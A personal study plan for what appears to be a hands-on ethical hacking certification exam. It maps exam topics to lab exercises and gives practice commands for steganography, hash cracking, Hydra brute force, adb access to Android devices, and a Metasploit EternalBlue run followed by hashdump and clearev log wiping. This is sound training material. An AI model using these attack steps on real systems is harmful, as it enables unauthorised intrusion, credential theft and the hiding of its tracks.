# All exam tasks

Every exam task mapped to where I practice it.

---

## Coverage map

| # | Exam topic (by flag count) | Lab | EC-Council | Desktop |
|---|---------------------------|-----|------------|---------|
| 1 | SQLi / SQLMap (2-3 flags) | ✅ 2.1, 2.5, 6.1 | — | — |
| 2 | Command injection (1-2) | ✅ 2.2, 2.5 | — | — |
| 3 | WordPress / WPScan (1) | ✅ 2.3 | — | — |
| 4 | Nikto/dirb (1) | ✅ 2.4 | — | — |
| 5 | Nmap scanning (2-3) | ✅ 1.1, 1.2 | — | — |
| 6 | Hydra online cracking (1-2) | ✅ 3.1, 3.2 | — | — |
| 7 | Hashcat/John offline (1) | ✅ 3.3 | — | — |
| 8 | SMB/NetBIOS enum (1) | ✅ 4.4 | — | — |
| 9 | SNMP enum (0-1) | ✅ 4.1 | — | — |
| 10 | LDAP enum (0-1) | ✅ 4.5 | — | — |
| 11 | NFS enum (0-1) | ✅ 4.2 | — | — |
| 12 | SMTP enum (0-1) | ✅ 4.3 | — | — |
| 13 | AS-REP Roasting (1) | ✅ 5.1 | — | — |
| 14 | Password spraying (0-1) | ✅ 5.2 | — | — |
| 15 | Kerberoasting (0-1) | ✅ 5.3 | M06 Task 5 | — |
| 16 | **Steganography (1-2)** | ❌ | ❌ | ✅ |
| 17 | **Crypto / VeraCrypt (1-2)** | ❌ | ✅ M20 | — |
| 18 | **Wireshark pcap (1-2)** | ❌ | ❌ | ✅ |
| 19 | **Android / PhoneSploit (1)** | ❌ | ✅ M17 | — |
| 20 | **Malware / DIE (1)** | ❌ | ✅ M07 | — |
| 21 | **OpenVAS / CVSS (1)** | ❌ | ✅ M05 | — |
| 22 | **Metasploit (1-2)** | ❌ | ✅ M06 Task 1 | — |

---

## Not in the lab — practice elsewhere

### 16. Steganography — desktop (30 min)

```bash
mkdir ~/steg-practice && cd ~/steg-practice

# steghide — embed in JPEG
# wget https://picsum.photos/800/600 -O photo.jpg
echo "FLAG{steghide_secret_found}" > hidden.txt
steghide embed -cf photo.jpg -ef hidden.txt -p "password123"
rm hidden.txt
# extract: steghide extract -sf photo.jpg -p password123
# info: steghide info photo.jpg

# steghide no password
echo "FLAG{no_password_steg}" > hidden2.txt
steghide embed -cf photo2.jpg -ef hidden2.txt -p ""
rm hidden2.txt
# extract: steghide extract -sf photo2.jpg (just enter for blank)

# snow (whitespace steg)
echo "This is a normal looking text file with nothing suspicious." > cover.txt
snow -C -m "FLAG{snow_whitespace_hidden}" -p "letmein" cover.txt stego.txt
# extract: snow -C -p "letmein" stego.txt

# binwalk — append zip to jpeg
echo "FLAG{binwalk_extracted}" > secret.txt
zip secret.zip secret.txt
cat photo.jpg secret.zip > suspicious.jpg
rm secret.txt secret.zip
# extract: binwalk -e suspicious.jpg

# OpenStego — GUI on Windows exam machine
# Extract Data → select image → enter password → extract
# practice once in EC-Council lab
```

Exam asks: "find the hidden message in the image on Desktop"
Try steghide first (blank pass, then common ones), then binwalk, then OpenStego on Windows.

---

### 17. Crypto / VeraCrypt — EC-Council M20 (30 min)

| Task | Tool | Where |
|------|------|-------|
| Mount encrypted volume, count files | VeraCrypt (Windows) | EC-Council M20 |
| Decrypt file with known key | CrypTool (Windows) | EC-Council M20 |
| Calculate file hashes | md5sum/sha256sum | Desktop |
| Compare hashes to find tampered file | md5sum | Desktop |
| Encode/decode text | BCTextEncoder (Windows) | EC-Council M20 |

Hash practice:
```bash
mkdir ~/hash-practice && cd ~/hash-practice

echo "quarterly report 2026 Q1 revenue 1.2M" > report1.txt
echo "quarterly report 2026 Q2 revenue 1.5M" > report2.txt
echo "quarterly report 2026 Q3 revenue TAMPERED" > report3.txt
echo "quarterly report 2026 Q4 revenue 2.1M" > report4.txt
# which one was tampered? md5sum report*.txt → report3

echo '5f4dcc3b5aa765d61d8327deb882cf99' > md5hash.txt    # "password"
echo '21232f297a57a5a743894a0e4a801fc3' > md5hash2.txt   # "admin"
echo '8621ffdbc5698829397d97767ac13db3' > md5hash3.txt   # "dragon"
# hashcat -m 0 md5hash.txt /usr/share/wordlists/rockyou.txt
```

Exam asks: "decrypt the VeraCrypt volume and count files" or "which file was tampered?"
On Windows → VeraCrypt → select file → mount → browse.

---

### 18. Wireshark — desktop (30 min)

```bash
# capture traffic from lab
sudo tcpdump -i any -w lab_capture.pcap host 10.10.55.10 or host 10.10.55.11 &

# generate some traffic
ftp 10.10.55.10        # login as ftpuser/hunter2
hydra -l alice -P /usr/share/wordlists/rockyou.txt 10.10.55.11 ssh -t 4
curl http://10.10.55.10/sqli.php?id=1

# stop: kill %1
# open in Wireshark
```

Filters to know:

| What | Filter |
|------|--------|
| FTP password | `ftp.request.command == "PASS"` |
| HTTP POST | `http.request.method == "POST"` |
| Traffic from IP | `ip.addr == 10.10.55.10` |
| DNS | `dns` |
| SMTP | `smtp` |
| Find scanner | `tcp.flags.syn == 1 && tcp.flags.ack == 0` then Statistics → Conversations |
| Extract data | Right-click → Follow → TCP Stream |

Or download pcaps from https://wiki.wireshark.org/SampleCaptures

---

### 19. Android / PhoneSploit — EC-Council M17 (30 min)

```
phonesploit
# or manually:
adb connect [target-ip]:5555
adb devices
adb shell
ls /sdcard/
adb pull /sdcard/[filename] .
```

Exam: "what files are on the Android device at 10.10.X.X?"
See port 5555 in nmap → adb connect → adb shell → browse → adb pull.
1 flag, always the same. 5 min in the lab is enough.

---

### 20. Malware / DIE — EC-Council M07 (30 min)

1. Open .exe in Detect It Easy
2. Entropy tab → note value
3. Packer detection → UPX?
4. Strings → anything suspicious?
5. File type, compiler info

Exam: "what is the entropy of suspicious.exe?" or "what packer was used?"
Open in DIE → Entropy tab → copy → paste. 1 flag, just GUI clicking.

---

### 21. OpenVAS — EC-Council M05 (30 min)

1. `gvm-start` (or already running)
2. Browser → https://localhost:9392
3. Scans → Tasks → New Task → target IP → Full and Fast → Start
4. Wait for scan
5. Find the CVE → note CVSS score

Exam: "what is the CVSS score of vulnerability X on target Y?"
Scans take 15-30 min, start it early if you see a vuln scanning question.

---

### 22. Metasploit

```
use exploit/windows/smb/ms17_010_eternalblue   # or psexec
set RHOSTS [ip]
set LHOST [your-ip]
exploit

# post-exploitation
getuid → getsystem → hashdump → hashcat -m 1000
shell → net user → whoami
search -f flag* → download
clearev
```

Exam: "what is the Administrator password on 10.10.X.X?"
Exploit → SYSTEM → hashdump → crack NTLM.

---

## Practice schedule

### Day 1: Lab CTF
- Set up Parrot VM
- Run through all 20 missions
- Set up steg + hash practice files

### Day 2: Speedrun + Wireshark
- Speedrun all 20 (target: <3 hours)
- Capture lab traffic → practice Wireshark filters
- Steg challenges

### Day 3: Speedrun + EC-Council
- Morning: speedrun again (target: <2 hours)
- Afternoon EC-Council:
  - M07 (DIE) — 30 min
  - M17 (PhoneSploit) — 30 min
  - M20 (VeraCrypt/CrypTool) — 30 min
  - M05 (OpenVAS) — 30 min

### Day 4: Mock exam
- 6 hour timer
- Scan lab from scratch like I've never seen it
- Only use cheatsheets
- Include steg/hash/Wireshark
- Score: each mission = 1 flag = 10 pts

### Day 5: Review
- Redo anything that took >10 min
- Review cheatsheets
- Quick pass through EC-Council for shaky tools
- Rest before exam

---

## Quick check — can I do these in <5 min each?

### Scanning
- [ ] Discover all hosts on a subnet
- [ ] Full port + service + OS scan
- [ ] Identify a DC by ports

### Web
- [ ] SQLMap: URL → databases → tables → dump
- [ ] Command injection: read /etc/passwd
- [ ] WPScan: enumerate users + brute force
- [ ] Nikto + dirb scan

### Password cracking
- [ ] Hydra: FTP, SSH, RDP, HTTP-form
- [ ] Hashcat: MD5 (-m 0), NTLM (-m 1000), Kerberos (-m 13100, -m 18200)
- [ ] John: basic wordlist crack
- [ ] Identify hash type by looking at it

### Enumeration
- [ ] enum4linux -a
- [ ] snmpwalk with public community string
- [ ] showmount + mount NFS
- [ ] smtp-user-enum
- [ ] ldapsearch anonymous bind

### AD
- [ ] GetNPUsers.py (AS-REP Roast)
- [ ] CrackMapExec password spray
- [ ] Kerberoasting with GetUserSPNs.py

### Steg
- [ ] steghide extract (with and without password)
- [ ] snow extract
- [ ] binwalk detect + extract
- [ ] OpenStego (know the GUI)

### Crypto
- [ ] md5sum / sha256sum to compare files
- [ ] VeraCrypt mount (know the GUI)
- [ ] CrypTool decrypt (know the GUI)

### Wireshark
- [ ] Filter by protocol (ftp, http, dns)
- [ ] Find credentials in pcap
- [ ] Follow TCP Stream
- [ ] Identify scanning activity

### Mobile
- [ ] adb connect + adb shell + adb pull

### Malware
- [ ] DIE → read entropy + packer

### Vuln scanning
- [ ] OpenVAS scan → find CVSS score

### Metasploit
- [ ] EternalBlue or psexec → meterpreter
- [ ] getsystem → hashdump
- [ ] search + download files
- [ ] clearev
